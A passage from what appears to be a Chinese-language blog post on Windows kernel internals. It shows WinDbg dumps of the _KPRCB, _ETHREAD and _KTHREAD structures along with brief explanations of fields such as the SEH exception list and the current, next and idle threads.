0y1</span><br><span class="line">   +0x18b1 BpbSmep          : 0y0</span><br><span class="line">   +0x18b1 BpbFeaturesReserved : 0y00000 (0)</span><br><span class="line">   +0x18b2 BpbCurrentSpecCtrl : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b3 BpbKernelSpecCtrl : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b4 BpbNmiSpecCtrl   : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x18b5 BpbUserSpecCtrl  : 0 &#x27;&#x27;</span><br><span class="line">   +0x18b6 PrcbPad50        : [42]  &quot;&quot;</span><br><span class="line">   +0x18e0 DpcData          : [2] _KDPC_DATA</span><br><span class="line">   +0x1908 DpcStack         : 0x80d90000 Void</span><br><span class="line">   +0x190c MaximumDpcQueueDepth : 0n4</span><br><span class="line">   +0x1910 DpcRequestRate   : 0</span><br><span class="line">   +0x1914 MinimumDpcRate   : 3</span><br><span class="line">   +0x1918 DpcLastCount     : 0x496b</span><br><span class="line">   +0x191c PrcbLock         : 0</span><br><span class="line">   +0x1920 DpcGate          : _KGATE</span><br><span class="line">   +0x1930 ThreadDpcEnable  : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x1931 QuantumEnd       : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x1932 DpcRoutineActive : 0 &#x27;&#x27;</span><br><span class="line">   +0x1933 IdleSchedule     : 0 &#x27;&#x27;</span><br><span class="line">   +0x1934 DpcRequestSummary : 0n8</span><br><span class="line">   +0x1934 DpcRequestSlot   : [2] 0n8</span><br><span class="line">   +0x1934 NormalDpcState   : 0n8</span><br><span class="line">   +0x1936 DpcThreadActive  : 0y0</span><br><span class="line">   +0x1936 ThreadDpcState   : 0n0</span><br><span class="line">   +0x1938 TimerHand        : 0x1a56</span><br><span class="line">   +0x193c LastTick         : 0x1a57</span><br><span class="line">   +0x1940 MasterOffset     : 0n81398</span><br><span class="line">   +0x1944 PrcbPad41        : [2] 0</span><br><span class="line">   +0x194c PeriodicCount    : 0</span><br><span class="line">   +0x1950 PeriodicBias     : 0</span><br><span class="line">   +0x1958 TickOffset       : 0x1236b</span><br><span class="line">   +0x1960 TimerTable       : _KTIMER_TABLE</span><br><span class="line">   +0x31a0 CallDpc          : _KDPC</span><br><span class="line">   +0x31c0 ClockKeepAlive   : 0n1</span><br><span class="line">   +0x31c4 ClockCheckSlot   : 0 &#x27;&#x27;</span><br><span class="line">   +0x31c5 ClockPollCycle   : 0xa8 &#x27;&#x27;</span><br><span class="line">   +0x31c6 PrcbPad6         : [2]  &quot;&quot;</span><br><span class="line">   +0x31c8 DpcWatchdogPeriod : 0n0</span><br><span class="line">   +0x31cc DpcWatchdogCount : 0n0</span><br><span class="line">   +0x31d0 ThreadWatchdogPeriod : 0n0</span><br><span class="line">   +0x31d4 ThreadWatchdogCount : 0n0</span><br><span class="line">   +0x31d8 KeSpinLockOrdering : 0n0</span><br><span class="line">   +0x31dc PrcbPad70        : [1] 0</span><br><span class="line">   +0x31e0 WaitListHead     : _LIST_ENTRY [ 0x87a1cdbc - 0x86928ae4 ]</span><br><span class="line">   +0x31e8 WaitLock         : 0</span><br><span class="line">   +0x31ec ReadySummary     : 0x100</span><br><span class="line">   +0x31f0 QueueIndex       : 1</span><br><span class="line">   +0x31f4 DeferredReadyListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x31f8 StartCycles      : 0x0000005d`20e43ca2</span><br><span class="line">   +0x3200 CycleTime        : 0x00000020`5b03abb8</span><br><span class="line">   +0x3208 HighCycleTime    : 0x20</span><br><span class="line">   +0x320c PrcbPad71        : 0</span><br><span class="line">   +0x3210 PrcbPad72        : [2] 0</span><br><span class="line">   +0x3220 DispatcherReadyListHead : [32] _LIST_ENTRY [ 0x80b9a340 - 0x80b9a340 ]</span><br><span class="line">   +0x3320 ChainedInterruptList : (null) </span><br><span class="line">   +0x3324 LookasideIrpFloat : 0n2147483647</span><br><span class="line">   +0x3328 MmPageFaultCount : 0n380185</span><br><span class="line">   +0x332c MmCopyOnWriteCount : 0n6594</span><br><span class="line">   +0x3330 MmTransitionCount : 0n139141</span><br><span class="line">   +0x3334 MmCacheTransitionCount : 0n0</span><br><span class="line">   +0x3338 MmDemandZeroCount : 0n227545</span><br><span class="line">   +0x333c MmPageReadCount  : 0n43411</span><br><span class="line">   +0x3340 MmPageReadIoCount : 0n10075</span><br><span class="line">   +0x3344 MmCacheReadCount : 0n0</span><br><span class="line">   +0x3348 MmCacheIoCount   : 0n0</span><br><span class="line">   +0x334c MmDirtyPagesWriteCount : 0n0</span><br><span class="line">   +0x3350 MmDirtyWriteIoCount : 0n0</span><br><span class="line">   +0x3354 MmMappedPagesWriteCount : 0n0</span><br><span class="line">   +0x3358 MmMappedWriteIoCount : 0n0</span><br><span class="line">   +0x335c CachedCommit     : 0xa3</span><br><span class="line">   +0x3360 CachedResidentAvailable : 0xf9</span><br><span class="line">   +0x3364 HyperPte         : 0x80c00004 Void</span><br><span class="line">   +0x3368 PrcbPad8         : [4]  &quot;&quot;</span><br><span class="line">   +0x336c VendorString     : [13]  &quot;GenuineIntel&quot;</span><br><span class="line">   +0x3379 InitialApicId    : 0 &#x27;&#x27;</span><br><span class="line">   +0x337a LogicalProcessorsPerPhysicalProcessor : 0x1 &#x27;&#x27;</span><br><span class="line">   +0x337b PrcbPad9         : [5]  &quot;&quot;</span><br><span class="line">   +0x3380 FeatureBits      : 0x60cd3fff</span><br><span class="line">   +0x3388 UpdateSignature  : _LARGE_INTEGER 0xffffffff`00000000</span><br><span class="line">   +0x3390 IsrTime          : 0</span><br><span class="line">   +0x3398 RuntimeAccumulation : 0x3eb41562</span><br><span class="line">   +0x33a0 PowerState       : _PROCESSOR_POWER_STATE</span><br><span class="line">   +0x3468 DpcWatchdogDpc   : _KDPC</span><br><span class="line">   +0x3488 DpcWatchdogTimer : _KTIMER</span><br><span class="line">   +0x34b0 WheaInfo         : 0x8691c0d0 Void</span><br><span class="line">   +0x34b4 EtwSupport       : 0x868d17d8 Void</span><br><span class="line">   +0x34b8 InterruptObjectPool : _SLIST_HEADER</span><br><span class="line">   +0x34c0 HypercallPageList : _SLIST_HEADER</span><br><span class="line">   +0x34c8 HypercallPageVirtual : 0x80d83000 Void</span><br><span class="line">   +0x34cc VirtualApicAssist : (null) </span><br><span class="line">   +0x34d0 StatisticsPage   : (null) </span><br><span class="line">   +0x34d4 RateControl      : (null) </span><br><span class="line">   +0x34d8 Cache            : [5] _CACHE_DESCRIPTOR</span><br><span class="line">   +0x3514 CacheCount       : 4</span><br><span class="line">   +0x3518 CacheProcessorMask : [5] 1</span><br><span class="line">   +0x352c PackageProcessorSet : _KAFFINITY_EX</span><br><span class="line">   +0x3538 PrcbPad91        : [1] 0</span><br><span class="line">   +0x353c CoreProcessorSet : 1</span><br><span class="line">   +0x3540 TimerExpirationDpc : _KDPC</span><br><span class="line">   +0x3560 SpinLockAcquireCount : 0x3465aa</span><br><span class="line">   +0x3564 SpinLockContentionCount : 0xb</span><br><span class="line">   +0x3568 SpinLockSpinCount : 0</span><br><span class="line">   +0x356c IpiSendRequestBroadcastCount : 0</span><br><span class="line">   +0x3570 IpiSendRequestRoutineCount : 0</span><br><span class="line">   +0x3574 IpiSendSoftwareInterruptCount : 0</span><br><span class="line">   +0x3578 ExInitializeResourceCount : 0x6bbf</span><br><span class="line">   +0x357c ExReInitializeResourceCount : 0x563</span><br><span class="line">   +0x3580 ExDeleteResourceCount : 0x58ac</span><br><span class="line">   +0x3584 ExecutiveResourceAcquiresCount : 0x2c9bf6</span><br><span class="line">   +0x3588 ExecutiveResourceContentionsCount : 0x649</span><br><span class="line">   +0x358c ExecutiveResourceReleaseExclusiveCount : 0x803a3</span><br><span class="line">   +0x3590 ExecutiveResourceReleaseSharedCount : 0x2494c7</span><br><span class="line">   +0x3594 ExecutiveResourceConvertsCount : 0x1bf</span><br><span class="line">   +0x3598 ExAcqResExclusiveAttempts : 0x7d665</span><br><span class="line">   +0x359c ExAcqResExclusiveAcquiresExclusive : 0x6d87b</span><br><span class="line">   +0x35a0 ExAcqResExclusiveAcquiresExclusiveRecursive : 0xfdd4</span><br><span class="line">   +0x35a4 ExAcqResExclusiveWaits : 0x346</span><br><span class="line">   +0x35a8 ExAcqResExclusiveNotAcquires : 0x16</span><br><span class="line">   +0x35ac ExAcqResSharedAttempts : 0x234556</span><br><span class="line">   +0x35b0 ExAcqResSharedAcquiresExclusive : 0x3244</span><br><span class="line">   +0x35b4 ExAcqResSharedAcquiresShared : 0x22d3fd</span><br><span class="line">   +0x35b8 ExAcqResSharedAcquiresSharedRecursive : 0x3f15</span><br><span class="line">   +0x35bc ExAcqResSharedWaits : 0x303</span><br><span class="line">   +0x35c0 ExAcqResSharedNotAcquires : 0</span><br><span class="line">   +0x35c4 ExAcqResSharedStarveExclusiveAttempts : 0x18051</span><br><span class="line">   +0x35c8 ExAcqResSharedStarveExclusiveAcquiresExclusive : 1</span><br><span class="line">   +0x35cc ExAcqResSharedStarveExclusiveAcquiresShared : 0x17faa</span><br><span class="line">   +0x35d0 ExAcqResSharedStarveExclusiveAcquiresSharedRecursive : 0xa6</span><br><span class="line">   +0x35d4 ExAcqResSharedStarveExclusiveWaits : 0</span><br><span class="line">   +0x35d8 ExAcqResSharedStarveExclusiveNotAcquires : 0</span><br><span class="line">   +0x35dc ExAcqResSharedWaitForExclusiveAttempts : 0</span><br><span class="line">   +0x35e0 ExAcqResSharedWaitForExclusiveAcquiresExclusive : 0</span><br><span class="line">   +0x35e4 ExAcqResSharedWaitForExclusiveAcquiresShared : 0</span><br><span class="line">   +0x35e8 ExAcqResSharedWaitForExclusiveAcquiresSharedRecursive : 0</span><br><span class="line">   +0x35ec ExAcqResSharedWaitForExclusiveWaits : 0</span><br><span class="line">   +0x35f0 ExAcqResSharedWaitForExclusiveNotAcquires : 0</span><br><span class="line">   +0x35f4 ExSetResOwnerPointerExclusive : 0</span><br><span class="line">   +0x35f8 ExSetResOwnerPointerSharedNew : 0x1d2</span><br><span class="line">   +0x35fc ExSetResOwnerPointerSharedOld : 0x74</span><br><span class="line">   +0x3600 ExTryToAcqExclusiveAttempts : 0</span><br><span class="line">   +0x3604 ExTryToAcqExclusiveAcquires : 0</span><br><span class="line">   +0x3608 ExBoostExclusiveOwner : 8</span><br><span class="line">   +0x360c ExBoostSharedOwners : 0</span><br><span class="line">   +0x3610 ExEtwSynchTrackingNotificationsCount : 0</span><br><span class="line">   +0x3614 ExEtwSynchTrackingNotificationsAccountedCount : 0</span><br><span class="line">   +0x3618 Context          : 0x80dc9340 _CONTEXT</span><br><span class="line">   +0x361c ContextFlags     : 0x10057</span><br><span class="line">   +0x3620 ExtendedState    : 0x80dc9000 _XSAVE_AREA</span><br><span class="line">   +0x3624 VectorToInterruptObject : [208] (null) </span><br><span class="line">   +0x3964 PrcbPad100       : [15] 0</span><br><span class="line">   +0x39a0 ProcessorSignature : 0xb0671</span><br><span class="line">   +0x39a4 PrcbShadowMappedPagePad1 : [335] 0</span><br><span class="line">   +0x3ee0 KernelDirectoryTableBase : 0</span><br><span class="line">   +0x3ee4 EspBaseShadow    : 0</span><br><span class="line">   +0x3ee8 UserEspShadow    : 0</span><br><span class="line">   +0x3eec ShadowFlags      : 0</span><br><span class="line">   +0x3ef0 UserDS           : 0</span><br><span class="line">   +0x3ef4 UserES           : 0</span><br><span class="line">   +0x3ef8 UserFS           : 0</span><br><span class="line">   +0x3efc EspIretd         : (null) </span><br><span class="line">   +0x3f00 RestoreSegOption : 0</span><br><span class="line">   +0x3f04 SavedEsi         : 0</span><br><span class="line">   +0x3f08 VerwSelector     : 0</span><br><span class="line">   +0x3f0a PrcbShadowPad    : 0</span><br><span class="line">   +0x3f0c TaskSwitchCount  : 0</span><br><span class="line">   +0x3f10 DbgLogs          : [512] 0</span><br><span class="line">   +0x4710 DbgCount         : 0</span><br><span class="line">   +0x4714 PrcbShadowMappedPagePad2 : [499] 0</span><br></pre></td></tr></table></figure><h4 id="ExceptionList"><a href="#ExceptionList" class="headerlink" title="ExceptionList"></a>ExceptionList</h4><p>错误链表，指向<code>EXCEPTION_REGISTRATION_RECORD</code>的列表，用于<code>SEH</code>，即为结构化异常处理，里面记录了异常处理函数。有人会称它为<code>SEH</code>链入口。</p><h4 id="CurrentThread"><a href="#CurrentThread" class="headerlink" title="CurrentThread"></a>CurrentThread</h4><p>当前<code>CPU</code>所执行线程的<code>ETHREAD</code>结构体。</p><h4 id="NextThread"><a href="#NextThread" class="headerlink" title="NextThread"></a>NextThread</h4><p>下一个<code>CPU</code>所执行线程的<code>ETHREAD</code>结构体。</p><h4 id="IdleThread"><a href="#IdleThread" class="headerlink" title="IdleThread"></a>IdleThread</h4><p>当所有的线程都执行完了<code>CPU</code>就执行这个线程。</p><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><p><code>CPU</code>编号。</p><h4 id="ProcessorState"><a href="#ProcessorState" class="headerlink" title="ProcessorState"></a>ProcessorState</h4><p><code>CPU</code>状态，是<code>_KPROCESSOR_STATE</code>结构体。</p><h4 id="NpxThread"><a href="#NpxThread" class="headerlink" title="NpxThread"></a>NpxThread</h4><p><code>Npx</code>浮点处理器，最后一次用过浮点的线程。</p><h4 id="LogicalProcessorsPerPhysicalProcessor"><a href="#LogicalProcessorsPerPhysicalProcessor" class="headerlink" title="LogicalProcessorsPerPhysicalProcessor"></a>LogicalProcessorsPerPhysicalProcessor</h4><p>指明每个物理处理器有几个逻辑处理器。</p><h4 id="MHz"><a href="#MHz" class="headerlink" title="MHz"></a>MHz</h4><p><code>CPU</code>的频率。</p><h3 id="ETHREAD"><a href="#ETHREAD" class="headerlink" title="ETHREAD"></a>ETHREAD</h3><p>因为讲到了 <code>KTHREAD</code> 故把 <code>ETHREAD</code> 也讲一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">ntdll!_ETHREAD</span><br><span class="line">   +0x000 Tcb              : _KTHREAD</span><br><span class="line">   +0x200 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x208 ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +0x208 KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   +0x210 ExitStatus       : Int4B</span><br><span class="line">   +0x214 PostBlockList    : _LIST_ENTRY</span><br><span class="line">   +0x214 ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   +0x218 StartAddress     : Ptr32 Void</span><br><span class="line">   +0x21c TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   +0x21c ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   +0x21c KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   +0x220 ActiveTimerListLock : Uint4B</span><br><span class="line">   +0x224 ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   +0x22c Cid              : _CLIENT_ID</span><br><span class="line">   +0x234 KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x234 AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   +0x248 ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   +0x24c IrpList          : _LIST_ENTRY</span><br><span class="line">   +0x254 TopLevelIrp      : Uint4B</span><br><span class="line">   +0x258 DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +0x25c CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   +0x260 Win32StartAddress : Ptr32 Void</span><br><span class="line">   +0x264 LegacyPowerObject : Ptr32 Void</span><br><span class="line">   +0x268 ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x270 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x274 ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   +0x278 ReadClusterSize  : Uint4B</span><br><span class="line">   +0x27c MmLockOrdering   : Int4B</span><br><span class="line">   +0x280 CrossThreadFlags : Uint4B</span><br><span class="line">   +0x280 Terminated       : Pos 0, 1 Bit</span><br><span class="line">   +0x280 ThreadInserted   : Pos 1, 1 Bit</span><br><span class="line">   +0x280 HideFromDebugger : Pos 2, 1 Bit</span><br><span class="line">   +0x280 ActiveImpersonationInfo : Pos 3, 1 Bit</span><br><span class="line">   +0x280 Reserved         : Pos 4, 1 Bit</span><br><span class="line">   +0x280 HardErrorsAreDisabled : Pos 5, 1 Bit</span><br><span class="line">   +0x280 BreakOnTermination : Pos 6, 1 Bit</span><br><span class="line">   +0x280 SkipCreationMsg  : Pos 7, 1 Bit</span><br><span class="line">   +0x280 SkipTerminationMsg : Pos 8, 1 Bit</span><br><span class="line">   +0x280 CopyTokenOnOpen  : Pos 9, 1 Bit</span><br><span class="line">   +0x280 ThreadIoPriority : Pos 10, 3 Bits</span><br><span class="line">   +0x280 ThreadPagePriority : Pos 13, 3 Bits</span><br><span class="line">   +0x280 RundownFail      : Pos 16, 1 Bit</span><br><span class="line">   +0x280 NeedsWorkingSetAging : Pos 17, 1 Bit</span><br><span class="line">   +0x284 SameThreadPassiveFlags : Uint4B</span><br><span class="line">   +0x284 ActiveExWorker   : Pos 0, 1 Bit</span><br><span class="line">   +0x284 ExWorkerCanWaitUser : Pos 1, 1 Bit</span><br><span class="line">   +0x284 MemoryMaker      : Pos 2, 1 Bit</span><br><span class="line">   +0x284 ClonedThread     : Pos 3, 1 Bit</span><br><span class="line">   +0x284 KeyedEventInUse  : Pos 4, 1 Bit</span><br><span class="line">   +0x284 RateApcState     : Pos 5, 2 Bits</span><br><span class="line">   +0x284 SelfTerminate    : Pos 7, 1 Bit</span><br><span class="line">   +0x288 SameThreadApcFlags : Uint4B</span><br><span class="line">   +0x288 Spare            : Pos 0, 1 Bit</span><br><span class="line">   +0x288 StartAddressInvalid : Pos 1, 1 Bit</span><br><span class="line">   +0x288 EtwPageFaultCalloutActive : Pos 2, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetExclusive : Pos 3, 1 Bit</span><br><span class="line">   +0x288 OwnsProcessWorkingSetShared : Pos 4, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetExclusive : Pos 5, 1 Bit</span><br><span class="line">   +0x288 OwnsSystemCacheWorkingSetShared : Pos 6, 1 Bit</span><br><span class="line">   +0x288 OwnsSessionWorkingSetExclusive : Pos 7, 1 Bit</span><br><span class="line">   +0x289 OwnsSessionWorkingSetShared : Pos 0, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceExclusive : Pos 1, 1 Bit</span><br><span class="line">   +0x289 OwnsProcessAddressSpaceShared : Pos 2, 1 Bit</span><br><span class="line">   +0x289 SuppressSymbolLoad : Pos 3, 1 Bit</span><br><span class="line">   +0x289 Prefetching      : Pos 4, 1 Bit</span><br><span class="line">   +0x289 OwnsDynamicMemoryShared : Pos 5, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaExclusive : Pos 6, 1 Bit</span><br><span class="line">   +0x289 OwnsChangeControlAreaShared : Pos 7, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetExclusive : Pos 0, 1 Bit</span><br><span class="line">   +0x28a OwnsPagedPoolWorkingSetShared : Pos 1, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetExclusive : Pos 2, 1 Bit</span><br><span class="line">   +0x28a OwnsSystemPtesWorkingSetShared : Pos 3, 1 Bit</span><br><span class="line">   +0x28a TrimTrigger      : Pos 4, 2 Bits</span><br><span class="line">   +0x28a Spare1           : Pos 6, 2 Bits</span><br><span class="line">   +0x28b PriorityRegionActive : UChar</span><br><span class="line">   +0x28c CacheManagerActive : UChar</span><br><span class="line">   +0x28d DisablePageFaultClustering : UChar</span><br><span class="line">   +0x28e ActiveFaultCount : UChar</span><br><span class="line">   +0x28f LockOrderState   : UChar</span><br><span class="line">   +0x290 AlpcMessageId    : Uint4B</span><br><span class="line">   +0x294 AlpcMessage      : Ptr32 Void</span><br><span class="line">   +0x294 AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   +0x298 AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   +0x2a0 CacheManagerCount : Uint4B</span><br><span class="line">   +0x2a4 IoBoostCount     : Uint4B</span><br><span class="line">   +0x2a8 IrpListLock      : Uint4B</span><br><span class="line">   +0x2ac ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   +0x2b0 CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x2b4 KernelStackReference : Uint4B</span><br></pre></td></tr></table></figure><p>其中 <code>TCB</code> 就是 <code>KTHREAD</code> 结构体，因此 <code>ETHREAD</code> 包含 <code>KTHREAD</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 CycleTime        : Uint8B</span><br><span class="line">   +0x018 HighCycleTime    : Uint4B</span><br><span class="line">   +0x020 QuantumTarget    : Uint8B</span><br><span class="line">   +0x028 InitialStack     : Ptr32 Void</span><br><span class="line">   +0x02c StackLimit       : Ptr32 Void</span><br><span class="line">   +0x030 KernelStack      : Ptr32 Void</span><br><span class="line">   +0x034 ThreadLock       : Uint4B</span><br><span class="line">   +0x038 WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   +0x039 Running          : UChar</span><br><span class="line">   +0x03a Alerted          : [2] UChar</span><br><span class="line">   +0x03c KernelStackResident : Pos 0, 1 Bit</span><br><span class="line">   +0x03c ReadyTransition  : Pos 1, 1 Bit</span><br><span class="line">   +0x03c ProcessReadyQueue : Pos 2, 1 Bit</span><br><span class="line">   +0x03c WaitNext         : Pos 3, 1 Bit</span><br><span class="line">   +0x03c SystemAffinityActive : Pos 4, 1 Bit</span><br><span class="line">   +0x03c Alertable        : Pos 5, 1 Bit</span><br><span class="line">   +0x03c GdiFlushActive   : Pos 6, 1 Bit</span><br><span class="line">   +0x03c UserStackWalkActive : Pos 7, 1 Bit</span><br><span class="line">   +0x03c ApcInterruptRequest : Pos 8, 1 Bit</span><br><span class="line">   +0x03c ForceDeferSchedule : Pos 9, 1 Bit</span><br><span class="line">   +0x03c QuantumEndMigrate : Pos 10, 1 Bit</span><br><span class="line">   +0x03c UmsDirectedSwitchEnable : Pos 11, 1 Bit</span><br><span class="line">   +0x03c TimerActive      : Pos 12, 1 Bit</span><br><span class="line">   +0x03c SystemThread     : Pos 13, 1 Bit</span><br><span class="line">   +0x03c Reserved         : Pos 14, 18 Bits</span><br><span class="line">   +0x03c MiscFlags        : Int4B</span><br><span class="line">   +0x040 ApcState         : _KAPC_STATE</span><br><span class="line">   +0x040 ApcStateFill     : [23] UChar</span><br><span class="line">   +0x057 Priority         : Char</span><br><span class="line">   +0x058 NextProcessor    : Uint4B</span><br><span class="line">   +0x05c DeferredProcessor : Uint4B</span><br><span class="line">   +0x060 ApcQueueLock     : Uint4B</span><br><span class="line">   +0x064 ContextSwitches  : Uint4B</span><br><span class="line">   +0x068 State            : UChar</span><br><span class="line">   +0x069 NpxState         : Char</span><br><span class="line">   +0x06a WaitIrql         : UChar</span><br><span class="line">   +0x06b WaitMode         : Char</span><br><span class="line">   +0x06c WaitStatus       : Int4B</span><br><span class="line">   +0x070 WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   +0x074 WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   +0x074 SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x07c Queue            : Ptr32 _KQUEUE</span><br><span class="line">   +0x080 WaitTime         : Uint4B</span><br><span class="line">   +0x084 KernelApcDisable : Int2B</span><br><span class="line">   +0x086 SpecialApcDisable : Int2B</span><br><span class="line">   +0x084 CombinedApcDisable : Uint4B</span><br><span class="line">   +0x088 Teb              : Ptr32 Void</span><br><span class="line">   +0x090 Timer            : _KTIMER</span><br><span class="line">   +0x0b8 AutoAlignment    : Pos 0, 1 Bit</span><br><span class="line">   +0x0b8 DisableBoost     : Pos 1, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc1Inserted : Pos 2, 1 Bit</span><br><span class="line">   +0x0b8 EtwStackTraceApc2Inserted : Pos 3, 1 Bit</span><br><span class="line">   +0x0b8 CalloutActive    : Pos 4, 1 Bit</span><br><span class="line">   +0x0b8 ApcQueueable     : Pos 5, 1 Bit</span><br><span class="line">   +0x0b8 EnableStackSwap  : Pos 6, 1 Bit</span><br><span class="line">   +0x0b8 GuiThread        : Pos 7, 1 Bit</span><br><span class="line">   +0x0b8 UmsPerformingSyscall : Pos 8, 1 Bit</span><br><span class="line">   +0x0b8 VdmSafe          : Pos 9, 1 Bit</span><br><span class="line">   +0x0b8 UmsDispatched    : Pos 10, 1 Bit</span><br><span class="line">   +0x0b8 ReservedFlags    : Pos 11, 21 Bits</span><br><span class="line">   +0x0b8 ThreadFlags      : Int4B</span><br><span class="line">   +0x0bc ServiceTable     : Ptr32 